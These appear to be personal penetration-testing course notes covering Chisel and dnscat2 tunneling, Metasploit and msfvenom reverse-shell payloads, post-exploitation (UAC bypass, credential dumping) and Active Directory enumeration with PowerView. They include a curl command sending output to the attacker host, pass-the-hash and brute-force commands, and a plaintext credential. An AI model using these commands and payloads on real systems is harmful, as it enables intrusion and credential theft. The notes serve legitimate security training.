Deep packet inspection devices may be configured to only allow specific transport protocols into, out of, or across the network. For example, a network administrator could create a rule that terminates any outbound SSH traffic. If they implemented that rule, all connections that use SSH for transport would fail, including any SSH port redirection and tunneling strategies we had implemented.
```

## **HTTP Tunneling**

![eda96a502a74d355b62ee0d8890a9818-PRAT2_9_0_ChiselSetup.png](eda96a502a74d355b62ee0d8890a9818-PRAT2_9_0_ChiselSetup.png)

```jsx
Specifically, a Deep Packet Inspection (DPI) solution is now terminating all outbound traffic except HTTP. In addition, all inbound ports on CONFLUENCE01 are blocked except TCP/8090. We can't rely on a normal reverse shell as it would not conform to the HTTP format and would be terminated at the network perimeter by the DPI solution. We also can't create an SSH remote port forward for the same reason. The only traffic that will reach our Kali machine is HTTP, so we could, for example, make requests with Wget and cURL.
```

```jsx
Now that we know what Chisel is capable of, we can plan. We will run a Chisel server on our Kali machine, which will accept a connection from a Chisel client running on CONFLUENCE01. Chisel will bind a SOCKS proxy port on the Kali machine. The Chisel server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted. The Chisel client will then decapsulate it and push it wherever it is addressed. When running, it should look somewhat like the following diagram:
```

Transfer chisel to target and `chmod +x`

https://github.com/jpillora/chisel/releases

On Kali : `chisel server --port 8000 --reverse`

```jsx
On target : 
We want to connect to the server running on our Kali machine
(**192.168.118.4:8080**), creating a reverse SOCKS tunnel
(**R:socks**). The **R** prefix specifies a reverse tunnel using a
**socks** proxy (which is bound to port **1080** by default). The
remaining shell redirections (**> /dev/null 2>&1 &**) force the
process to run in the background, so our injection does not hang
waiting for the process to finish.

```

`/tmp/chisel client 192.168.118.4:8000 R:socks > /dev/null 2>&1 &`

`start "" chisel.exe client 192.168.118.4:8000 R:socks`

`Start-Process -NoNewWindow -FilePath "chisel.exe" -ArgumentList "client 192.168.118.4:8080 R:socks"`

But the above linux comand will not work if chisel compiled version mismatch then we hhave to redirect the output back to kali to see the error if we dont have a proper shell

### GET OUTPUT TO KALI

 `sudo tcpdump -nvvvXi tun0 tcp port 8080`
`/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/`

```jsx
We get the output that running /tmp/chisel produces. Chisel is trying to use versions 2.32 and 2.34 of glibc, which the CONFLUENCE01 server does not have.
```

`chisel -h`

The version of Chisel that ships with this version of Kali is 1.8.1. However, there is another detail that's important here. It has been compiled with Go version 1.20.7.

Old version : wget [https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz](https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz)

 Chisel server has logged an inbound connection.

# SSH THROUGH PROXY

`sudo apt install ncat` 

`ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' [database_admin@10.4.50.215](mailto:database_admin@10.4.50.215)`

## **DNS Tunneling**

VERY GOOD INFORMATION :

```jsx
IP addresses, not human-readable names, are used to route Internet data. Whenever we want to access a domain by its domain name, we need first obtain its IP address. To retrieve (or resolve) the IP address of a human-readable address, we need to ask various DNS servers. Let's walk through the process of resolving the IPv4 address of "www.example.com".

In most cases, we'll ask a DNS recursive resolver server for the DNS address record (A record) of the domain. An A record is a DNS data type that contains an IPv4 address. The recursive resolver does most of the work: it will make all the following DNS queries until it satisfies the DNS request, then returns the response to us.

Once it retrieves the request from us, the recursive resolver starts making queries. It holds a list of root name servers (as of 2022, there are 13 of them scattered around the world). Its first task is to send a DNS query to one of these root name servers. Because example.com has the ".com" suffix, the root name server will respond with the address of a DNS name server that's responsible for the .com top-level domain (TLD). This is known as the TLD name server.

The recursive resolver then queries the .com TLD name server, asking which DNS server is responsible for example.com. The TLD name server will respond with the authoritative name server for the example.com domain.

The recursive resolver then asks the example.com authoritative name server for the IPv4 address of www.example.com. The example.com authoritative name server replies with the A record for that.

The recursive resolver then returns that to us. All these requests and responses are transported over UDP, with UDP/53 being the standard DNS port.
```

![fd4ea387a6681202405ff01a0766867a-PRAT2_A_0_DNSExplainer.png](fd4ea387a6681202405ff01a0766867a-PRAT2_A_0_DNSExplainer.png)

```jsx
It's common to use the recursive resolver provided by an ISP (which is usually pre-programmed into the stock ISP router), but other well-known public recursive name servers can be used as well. For example, Google has a public DNS server at 8.8.8.8.
```

For lab : `cd dns_tunneling` 

`cat dnsmasq.conf`

```jsx
# Define the zone
auth-zone=feline.corp
auth-server=feline.corp
```

`sudo dnsmasq -C dnsmasq.conf -d`

`sudo tcpdump -i ens192 udp port 53`

PGDATABASE : `resolvectl status`

`nslookup exfiltrated-data.feline.corp`

```jsx
nslookup used the DNS server running on the localhost interface of 127.0.0.53. This is normal as it's the DNS resolver provided by the systemd-resolved service running on Ubuntu. It will forward the query to the DNS server that's configured by Netplan. However, it may cache results. If we receive outdated DNS responses, we should try flushing the local DNS cache with resolvectl flush-caches. We can also query the DNS server directly by appending the serve address to the nslookup command. For example: nslookup exfiltrated-data.feline.corp 192.168.50.64.
```

Add sample txt records : `cat dnsmasq_txt.conf`

```jsx
# TXT record
txt-record=www.feline.corp,here's something useful!
txt-record=www.feline.corp,here's something else less useful.
```

`sudo dnsmasq -C dnsmasq_txt.conf -d`

`nslookup -type=txt www.feline.corp`

## **DNS Tunneling with dnscat2**

```jsx
A dnscat2 server runs on an authoritative name server for a particular domain, and clients (which are configured to make queries to that domain) are run on compromised machines.
```

`felin : sudo tcpdump -i ens192 udp port 53`

`dnscat2-server feline.corp`

`cd dnscat/`

`./dnscat feline.corp`

`windows`

`window -i 1`

`?`

`listen --help`

`listen 127.0.0.1:4455 172.16.2.11:445` listen on 0.0.0.0 if want to connect from kali

`smbclient -p 4455 -L [//127.0.0.1](https://127.0.0.1/) -U hr_admin --password=Welcome1234`

# **Metasploit**

`sudo msfdb init`

`sudo systemctl enable postgresql`

`sudo msfconsole`

`db_status`

`help`

Workspace

`workspace`

`workspace -a pen200`

Using nmap

`db_nmap`

`db_nmap -A 192.168.50.202`

`hosts`

`services`

`services -p 8000`

Module :

`show -h`

```jsx
The modules all follow a common slash-delimited
hierarchical syntax (*module type/os, vendor, app, operation, or
protocol/module name*)
```

## **Auxiliary Modules**

```jsx
The Metasploit Framework includes hundreds of auxiliary modules that provide functionality such as protocol enumeration, port scanning, fuzzing, sniffing, and more. Auxiliary modules are useful for many tasks, including information gathering (under the gather/ hierarchy), scanning and enumeration of various services (under the scanner/ hierarchy), and so on.
```

`show auxiliary`

```jsx
We can use search to reduce this considerable output, filtering by app, type, CVE ID, operation, platform, and more. For this first example, we want to obtain the SMB version of the previously scanned system BRUTE2 by using a Metasploit auxiliary module.
```

`search type:auxiliary smb`

`use`

`info`

`show options`

`set RHOSTS 192.168.50.202`

`unset`

`services -p 445 --rhosts`

`run`

`vulns`

ssh brute : `*auxiliary/scanner/ssh/ssh_login*`

`set PASS_FILE /usr/share/wordlists/rockyou.txt`

`set USERNAME george`

`creds`

## **Exploit Modules**

`search Apache 2.4.49`

`set payload linux/x64/shell_reverse_tcp`

`set SSL false`

`sessions -l`

`sessions -i 2`

**`sessions -k`**

## **Staged vs Non-Staged Payloads**

`show payloads`

```jsx
 15  payload/linux/x64/shell/reverse_tcp       Staged

 20  payload/linux/x64/shell_reverse_tcp       Inline
 
 At this point, we should note that all Meterpreter payloads are staged
```

`set payload 15`

## **Meterpreter Payload**

```jsx
Metasploit contains the Meterpreter payload, which is a multi-function payload that can be dynamically extended at run-time. The payload resides entirely in memory on the target and its communication is encrypted by default. Meterpreter offers capabilities that are especially useful in the post-exploitation phase and exists for various operating systems, such as Windows, Linux, macOS, Android, and more.
```

```jsx
At this point, we should note that all Meterpreter payloads are staged; however, the output of show payloads contains both staged and non-staged payloads. The difference between those two types is how the Meterpreter payload is transferred to the target machine. The non-staged version includes all components required to launch a Meterpreter session while the staged version uses a separate first stage to load these components.
```

## Interactive Shell

`shell`

Background Shell : CTRL+Z

`channel -l`

`channel -i 1`

## UseFull Commands

```jsx
 Commands with "l" as prefix operate on the local system; in our case our Kali VM.
```

`lpwd`

`upload /usr/bin/unix-privesc-check /tmp/`

 `If our target runs the Windows operating system, we need to escape the backslashes in the destination path with backslashes like "\\".`

## **Executable Payloads**

`msfvenom -l payloads --platform windows --arch x64`

Stageless :

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe`

Staged :

`msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe`

```jsx
While we received an incoming connection, we cannot execute any commands through it. This is because Netcat doesn't know how to handle a staged payload.
```

`use multi/handler` set lport and lhost

`set payload windows/x64/shell/reverse_tcp`

```jsx
# List all payloads
msfvenom -l payloads
| grep php  

# List all encoders
msfvenom -l encoders

# List all output formats
msfvenom -l formats

# List all platforms
msfvenom -l platforms

# List all architectures
msfvenom -l archs

# List available options for a specific payload
msfvenom -p php/meterpreter_reverse_tcp --list-options

```

```jsx
# Windows EXE Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe

# Linux ELF Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf

# PHP Web Payload
msfvenom -p php/meterpreter_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o shell.php

# ASP Web Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f asp -o shell.asp

# Python Reverse Shell
msfvenom -p cmd/unix/reverse_python LHOST=YOUR_IP LPORT=4444 -f raw -o shell.py

```

## **Post-Exploitation with Metasploit**

# SET TARGET ALWAYS

`idletime`

`whoami /priv`

`getuid`

`getsystem`

`ps`

`Before attempting to access the flag, please note that you need to migrate the process to OneDrive.exe`

`You can use the "getenv Flag" command to retrieve the flag.`

```jsx
If the migrate command returns the error Error while running command migrate: undefined method `pid' for nil, make sure Metasploit is updated to the latest version
```

`migrate 8052` > Move exe for connection like OneDrive but it will be low Integrity

We can create a process and then migrate to it 

`execute -H -f notepad`

Upgrade to meterpreter : 

`sessions -u 1`

IMPORTANT : 

`set`

```jsx
Meterpreter offers a variety of other interesting post-exploitation modules such as hashdump, which dumps the contents of the SAM database or screenshare, which displays the target machine's desktop in real-time.
```

```jsx
But if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we can bypass User Account Control (UAC).
```

`shell`

`powershell -ep bypass`

`Import-Module NtObjectManager`

`Get-NtTokenIntegrityLevel`

`search UAC`

**`exploit/windows/local/bypassuac_sdclt`**

`set SESSION 9`

`load kiwi`

`creds_msv`

SKIPPING PIVOTING

## **Resource Scripts**

`ls -l /usr/share/metasploit-framework/scripts/resource`

## **Active Directory Introduction**

```jsx
An AD environment has a critical dependency on the Domain Name System (DNS) service. As such, a typical domain controller will also host a DNS server that is authoritative for a given domain.
```

What are OUs ?

```jsx
To ease the management of various objects and assist with management, system administrators often organize these objects into Organizational Units (OUs).
```

```jsx
OUs are comparable to file system folders in that they are containers used to store objects within the domain.
```

```jsx
For example, a user object may include attributes such as first name, last name, username, phone number, etc.
```

What is DC ?

```jsx
When a user attempts to log in to the domain, a request is sent to a Domain Controller (DC), which checks whether or not the user is allowed to log in to the domain
```

```jsx
One or more DCs act as the hub and core of the domain, storing all OUs, objects, and their attributes. Since the DC is such a central domain component, we'll pay close attention to it as we enumerate AD.
```

Groups And OUs

```jsx
Objects can be assigned to AD groups so that administrators can manage those objects as a single unit. For example, users in a group could be given access to a file server share or given administrative access to various clients in the domain. Attackers often target high-privileged groups.
```

Domain Admins

```jsx
Members of Domain Admins are among the most privileged objects in the domain. If an attacker compromises a member of this group (often referred to as domain administrators), they essentially gain complete control over the domain
```

IMPORTANT

```jsx
AD instance can host more than one domain in a domain tree or multiple domain trees in a domain forest.
```

Enterprise Admins

```jsx
Enterprise Admins group are granted full control over all the domains in the forest and have Administrator privilege on all DCs. This is obviously a high-value target for an attacker.
```

LDAP

```jsx
AD enumeration relies on LDAP. When a domain machine searches for an object, like a printer, or when we query user or group objects, LDAP is used as the communication channel for the query. In other words, LDAP is the protocol used to communicate with Active Directory.
```

PDC

```jsx
to make our enumeration as accurate as possible, we should look for the DC that holds the most updated information. This is known as the Primary Domain Controller (PDC). There can be only one PDC in a domain
```

 ****

DN

```jsx
DistinguishedName (DN) is a part of the LDAP path. A DN is a name that uniquely identifies an object in AD, including the domain itself. If we aren't familiar with LDAP, this may be somewhat confusing so let's go into a bit more detail.
```

## **Enumeration**

`netexec smb 192.168.1.0/24 --local-auth`

Senario

```jsx
The user we have access to is stephanie who has remote desktop permissions on a Windows 11 machine that is a part of the domain. This user is not a local administrator on the machine, which is something we may need to take into consideration as we move along.
```

IMPORTANT

```jsx
For example, if we gain access to another low-privileged user account that seems to have the same access as stephanie, we shouldn't simply dismiss it. Instead, we should always repeat our enumeration with that new account since administrators often grant individual users increased permissions based on their unique role in the organization. This persistent "rinse and repeat" process is the key to successful enumeration and works extremely well, especially in large organizations.
```

## **Manual Enumeration**

AD contains so much information that it can be hard to determine where to start enumerating. But since every AD installation fundamentally contains users and groups, we'll start there.

```jsx
When you have access to AD credentials, we suggest using RDP as much as possible. If you use PowerShell Remoting and winrm to connect to a machine, you may no longer be able to run domain enumeration tools as you will experience the Kerberos Double Hop issue. To avoid it, the simplest way is to use RDP. Kerberos Double-Hop is discussed in detail in the PEN-300 course material.
```

`net user /domain`

IMPORTANT

```jsx
Administrators often tend to add prefixes or suffixes to usernames that identify accounts by their function.
```

`net user jeffadmin /domain`

`net group /domain` some of them are default : https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups

`net group "Sales Department" /domain`

### **Enumerating Active Directory using PowerShell and .NET Classes**

```jsx
PowerShell cmdlets like Get-ADUser work well but they are only installed by default on domain controllers as part of the Remote Server Administration Tools (RSAT). RSAT is very rarely present on clients in a domain, and we must have administrative privileges to install them. While we can, in principle, import the DLL required for enumeration ourselves, we will investigate other options.
```

```jsx
LDAP://HostName[:PortNumber][/DistinguishedName]
```

```jsx
The Hostname can be a computer name, IP address or a domain name. In our case, we are working with the corp.com domain, so we could simply add that to our LDAP path and likely obtain information. Note that a domain may have multiple DCs, so setting the domain name could potentially resolve to the IP address of any DC in the domain.
```

```jsx
we need to find the DC holding the PdcRoleOwner property

The PortNumber for the LDAP connection is optional as per Microsoft's documentation. 
```

IMPORTANT

```jsx
However, it is worth noting that if we come across a domain in the future using non-default ports, we may need to manually add this to the script.
```

```jsx
Lastly, a DistinguishedName (DN) is a part of the LDAP path. A DN is a name that uniquely identifies an object in AD, including the domain itself. If we aren't familiar with LDAP, this may be somewhat confusing so let's go into a bit more detail.
```

Example DN : 

`CN=Stephanie,CN=Users,DC=corp,DC=com`

```jsx
The Listing above shows a few new references we haven't seen earlier in this Module, such as CN and DC. The CN is known as the Common Name, which specifies the identifier of an object in the domain. While we normally refer to "DC" as the Domain Controller in AD terms, "DC" means Domain Component when we are referring to a Distinguished Name. The Domain Component represents the top of an LDAP tree and in this case, we refer to it as the Distinguished Name of the domain itself.
```

```jsx
When reading a DN, we start with the Domain Component objects on the right side and move to the left. In the example above, we have four components, starting with two components named DC=corp,DC=com. The Domain Component objects as mentioned above represent the top of an LDAP tree following the required naming standard.
```

```jsx
Continuing through the DN, CN=Users represents the Common Name for the container where the user object is stored (also known as the parent container). Finally, all the way to the left, CN=Stephanie represents the Common Name for the user object itself, which is also lowest in the hierarchy.

In our case for the LDAP path, we are interested in the Domain Component object, which is DC=corp,DC=com. If we added CN=Users to our LDAP path, we would restrict ourselves by only being able to search objects within that given container.
```

`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` > 

`PdcRoleOwner        : DC1.corp.com`

Script :

First, we'll create a variable that will store the domain object, then we will print the variable so we can verify that it still works within our script. 

```jsx
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Print the variable
$domainObj
```

We will keep the *$domainObj* for the time being and create a new variable called *$PDC*, which will extract the value from the *PdcRoleOwner* property held in our *$domainObj* variable:

```jsx
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

# Print the $PDC variable
$PDC
```

We can use ADSI directly in PowerShell to retrieve the DN. We'll use two single quotes to indicate that the search starts at the top of the AD hierarchy.

`([adsi]'').distinguishedName`

```jsx
# Store the domain object in the $domainObj variable
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Store the PdcRoleOwner name to the $PDC variable
$PDC = $domainObj.PdcRoleOwner.Name

# Store the Distinguished Name variable into the $DN variable
$DN = ([adsi]'').distinguishedName

# Print the $DN variable
$DN
```

At this point, we are dynamically obtaining the Hostname and the DN
with our script. Now we must assemble the pieces to build the full
LDAP path. To do this, we'll add a new *$LDAP* variable to our script
that will contain the *$PDC* and *$DN* variables, prefixed with
"LDAP://".

The final script generates the LDAP shown below. Note that to
clean it up, we have removed the comments. Since we only needed the
*PdcRoleOwner* property's name value from the domain object, we add
that directly in our *$PDC* variable on the first line, limiting the
amount of code required:

```jsx
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

So far, our script builds the required LDAP path. Now we can build in search functionality.

To do this, we will use two .NET classes that are located in
the *System.DirectoryServices* namespace, more specifically the
[*DirectoryEntry*](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0)
and
[*DirectorySearcher*](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=dotnet-plat-ext-6.0)
classes. Let's discuss these before we implement them.

IMPORTANT

```jsx
One thing to note with DirectoryEntry is that we can pass it credentials to authenticate to the domain. However, since we are already logged in, there is no need to do that here.
```

```jsx
Filtering the output is rather simple, and there are several ways to do so. One way is to set up a filter that will sift through the samAccountType attribute, which is an attribute applied to all user, computer, and group objects.
```

```jsx
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)

$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"
$dirsearcher.FindAll()
```

```jsx
When enumerating AD, we are very interested in the attributes of each object, which are stored in the Properties field.
```

```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

`Import-Module .\function.ps1`

`LDAPSearch -LDAPQuery "(samAccountType=805306368)”`

We can also search directly for an *Object Class*, which is a
component of AD that defines the object type. Let's use
**objectClass=group** in this case to list all the groups in the
domain:

`LDAPSearch -LDAPQuery "(objectclass=group)"`

`foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
$group.properties | select {$*.cn}, {$*.member}
}`

`$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))”`

`$sales.properties.member`

This is a group within a group, known as a *nested group*. Nested
groups are relatively common in AD and scales well, allowing
flexibility and dynamic membership customization of even the largest
AD implementations.

`$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))”`

$group.properties.member

### IMPORTANT

 if misconfigured, users may end up with more privileges than they were intended to have. This might allow attackers to take advantage of the misconfiguration to further expand their reach inside the compromised domain.

### ALWAYS CHECK COMMENTS OF USER ACC

## **PowerView**

`Import-Module .\PowerView.ps1`

https://powersploit.readthedocs.io/en/latest/Recon/

### USERS

`Get-NetDomain`

`Get-NetUser`

```jsx
Get-NetUser automatically enumerates all attributes on the user objects. This presents a lot of information, which can be difficult to digest.
```

`Get-NetUser | select cn`

IMPORTANT

```jsx
 if a user hasn't changed their password since a recent password policy change, their password may be weaker than the current policy. This might make it more vulnerable to password attacks.
```

`Get-NetUser | select cn,pwdlastset,lastlogon`

### GROUPS

`Get-NetGroup | select cn`

GET MEMBERS

`Get-NetGroup "Sales Department" | select member`

## **Manual Enumeration**

C:\Users\Administrator\APPDATA\local\microsoft\Remote Desktop Connection Manager

**OS**

**`Get-NetComputer`** PowerView command to enumerate the
computer  

`Get-NetComputer | select operatingsystem,dnshostname` operatingsystem and dns hostname
I think maybe its for zero logon
 `it appears we are dealing with a web server and a file server that will require our attention at some point as well.`

`ldapsearch -x -h 172.31.3.2 -s base namingcontexts`

`ldapsearch -x -h 172.31.3.2 -s sub -b 'DC=roast,DC=csl' > data.roast` 

`less data.roast/password`

IMPORTANT

```jsx
In addition, an organization's most sensitive and important data may be stored in locations that do not require domain administrator privileges, such as a database or a file server. 
```

**Permissions and Logged on Users**

```jsx
PowerView's Find-LocalAdminAccess command scans the network to determine if our current user has administrative permissions on any computers in the domain. The command relies on the OpenServiceW function, which will connect to the Service Control Manager (SCM) on the target machines. The SCM essentially maintains a database of installed services and drivers on Windows computers. PowerView will attempt to open this database with the SC_MANAGER_ALL_ACCESS access right, which require administrative privileges, and if the connection is successful, PowerView will deem that our current user has administrative privileges on the target machine.
```

`Find-LocalAdminAccess` then try running `.\PsLoggedon.exe` explained below

```jsx
PowerView's Get-NetSession command uses the NetWkstaUserEnum and NetSessionEnum APIs under the hood
```

`Get-NetSession -ComputerName files04`

```jsx
A simple explanation would be that there are no users logged in on the machines. However, to make sure we aren't receiving any error messages, let's add the -Verbose flag
```

`Get-NetSession -ComputerName files04 -Verbose`

```jsx
In a real-world engagement, or even in the Challenge Labs, we might accept that enumerating sessions with PowerView does not work and try to use a different tool. However, let's use this as a learning opportunity and take a deeper dive into the NetSessionEnum API and try to figure out exactly why it does not work in our case.

According to the documentation for NetSessionEnum, there are five possible query levels: 0,1,2,10,502. Level 0 only returns the name of the computer establishing the session. Levels 1 and 2 return more information but require administrative privileges.
```

```jsx
This leaves us with Levels 10 and 502. Both should return information such as the name of the computer and name of the user establishing the connection. By default, PowerView uses query level 10 with NetSessionEnum, which should give us the information we are interested in.

The permissions required to enumerate sessions with NetSessionEnum are defined in the SrvsvcSessionInfo registry key, which is located in the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity hive.
```

`Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl`

IMPORTANT

```jsx
However, the BUILTIN group, NT AUTHORITY group, CREATOR OWNER and APPLICATION PACKAGE AUTHORITY are defined by the system, and do not allow NetSessionEnum to enumerate this registry key from a remote standpoint.
```

```jsx
Fortunately there are other tools we can use, such as the PsLoggedOn application from the SysInternals Suite. The documentation states that PsLoggedOn will enumerate the registry keys under HKEY_USERS to retrieve the security identifiers (SID) of logged-in users and convert the SIDs to usernames. PsLoggedOn will also use the NetSessionEnum API to see who is logged on to the computer via resource shares.

One limitation, however, is that PsLoggedOn relies on the Remote Registry service to scan the associated key. The Remote Registry service has not been enabled by default on Windows workstations since Windows 8, but system administrators may enable it for various administrative tasks, for backwards compatibility, or for installing monitoring/deployment tools, scripts, agents, etc.

It is also enabled by default on later Windows Server Operating Systems such as Server 2012 R2, 2016 (1607), 2019 (1809), and Server 2022 (21H2). If it is enabled, the service will stop after ten minutes of inactivity to save resources, but it will re-enable (with an automatic trigger) once we connect with PsLoggedOn.

With the theory out of the way for now, let's try to run PsLoggedOn against the computers we attempted to enumerate earlier, starting with FILES04 and WEB04. PsLoggedOn is in C:\Tools\PSTools on CLIENT75. To use it, we'll simply run it with the target hostname:
```

`.\PsLoggedon.exe \\files04`

`.\PsLoggedon.exe \\web04`

```jsx
According to the output, there are no users logged in on WEB04. This may be a false positive since we cannot know for sure that the Remote Registry service is running, but we didn't receive any error messages, which suggests the output is accurate. For now, we will simply have to trust our enumeration and accept that no users are logged in on the specific server.
```

## **Enumeration Service Principal Names**

```jsx
When applications like Exchange, MS SQL, or Internet Information Services (IIS) are integrated into AD, a unique service instance identifier known as Service Principal Name (SPN) associates a service to a specific service account in Active Directory.
```

```jsx
Managed Service Accounts, introduced with Windows Server 2008 R2, were designed for complex applications, which require tighter integration with Active Directory.

Larger applications like MS SQL and Microsoft Exchange often required server redundancy when running to guarantee availability, but Managed Service Accounts did not support this. To remedy this, Group Managed Service Accounts were introduced with Windows Server 2012, but this requires that domain controllers run Windows Server 2012 or higher. Because of this, some organizations may still rely on basic Service Accounts.
```

```jsx
To enumerate SPNs in the domain, we have multiple options. In this case, we'll use setspn.exe, which is installed on Windows by default. We'll use -L to run against both servers and clients in the domain.

 AD by simply enumerating all SPNs in the domain, meaning we don't need to run a broad port scan.
```

`setspn -L iis_service`

`Get-NetUser -SPN | select samaccountname,serviceprincipalname`

`nslookup.exe [web04.corp.com](http://web04.corp.com/)`

## **Enumerating Object Permissions**

```jsx
In short, an object in AD may have a set of permissions applied to it with multiple Access Control Entries (ACE). These ACEs make up the Access Control List (ACL). Each ACE defines whether access to the specific object is allowed or denied.
```

`Find-InterestingDomainAcl -ResolveGUIDS -Domain [corp.com](http://corp.com/)`

```jsx
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

[ABUSING OBJECT PERMISSIONS](https://www.notion.so/ABUSING-OBJECT-PERMISSIONS-224cb303896380f087e3cb337987e57f?pvs=21)

https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks

```jsx
We can use Get-ObjectAcl to enumerate ACEs with PowerView. To get started, let's enumerate our own user to determine which ACEs are applied to it. We can do this by filtering on -Identity:
```

`Get-ObjectAcl -Identity stephanie`

VERY IMPORTANT

```jsx
we notice that we have GenericWrite or GenericAll permissions on another AD user account. Using these permissions, we could reset their passwords, but this would lock out the user from accessing the account. We could also leverage these permissions to modify the User Account Control value of the user to not require Kerberos preauthentication. This attack is known as Targeted AS-REP Roasting. Notably, we should reset the User Account Control value of the user once we've obtained the hash.
```

```jsx
The amount of output may seem overwhelming since we enumerated every ACE that grants or denies some sort of permission to stephanie. While there are many properties that seem potentially useful, we are primarily interested in those highlighted in the truncated output

1-ObjectSID 
2-ActiveDirectoryRights
3-SecurityIdentifier
```

`Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104`

Attack Vextor : `Find-InterestingDomainAcl -ResolveGUIDS -Domain [corp.com](http://corp.com/)` if found generic write we can make disable kerberos pre-auth and the do as-rep see as-rep roast section to do it

IMPORTANT

```jsx
The output lists two Security Identifiers (SID), unique values that represent an object in AD. The first (located in the highlighted ObjectSID property) contains the value "S-1-5-21-1987370270-658905905-1781884369-1104", which is rather difficult to read. In order to make sense of the SID, we can use PowerView's Convert-SidToName command to convert it to an actual domain object name:

PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie

    Listing 59 - Converting the ObjectISD into name

The conversion reveals that the SID in the ObjectSID property belongs to the stephanie user we are currently using. The ActiveDirectoryRights property describes the type of permission applied to the object. To find out who has the ReadProperty permission in this case, we need to convert the SecurityIdentifier value.

Let's use PowerView to convert it into a name we can read:

PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers

 While this is a common configuration in AD and likely won't give us an attack vector, we have used the example to make sense of the information we have obtained.

```

**Generic All On Group**

If the group is An OU we can change its user password :

 `Get-ADObject -Identity "CN=Management Department,DC=corp,DC=com" -Properties objectClass`

Or we can add our self in group

`Add-ADGroupMember -Identity "Management Department" -Members stephanie`

## **Enumerating Domain Shares**

`smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`

`nxc smb 10.10.11.69  -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares`

`-M presence and —dpapi`

`Find-DomainShare`

```jsx
Although some of these are default domain shares, we should investigate each of them in search of interesting information.
```

```jsx
In this instance, we'll first focus on SYSVOL, as it may include files and folders that reside on the domain controller itself. This share is typically used for various domain policies and scripts. By default, the SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name on the domain controller and every domain user has access to it.
```

`ls \\dc1.corp.com\sysvol\corp.com\`

`ls \\dc1.corp.com\sysvol\corp.com\Policies\` > Check all properply

`cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml` > useful for privilege escalation and GPP password hunting.

```jsx
Group Policy Preferences XML files (Groups.xml, ScheduledTasks.xml) with embedded credentials (legacy issue).

Login scripts that may leak internal logic or secrets.
```

```jsx
However, even though GPP-stored passwords are encrypted with AES-256, the private key for the encryption has been posted on MSDN. We can use this key to decrypt these encrypted passwords. In this case, we'll use the gpp-decrypt ruby script in Kali Linux that decrypts a given GPP encrypted string:
```

`gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"`
P@$$w0rd

`ls \\FILES04\docshare`

## **Automated Enumeration**

 **SharpHound**

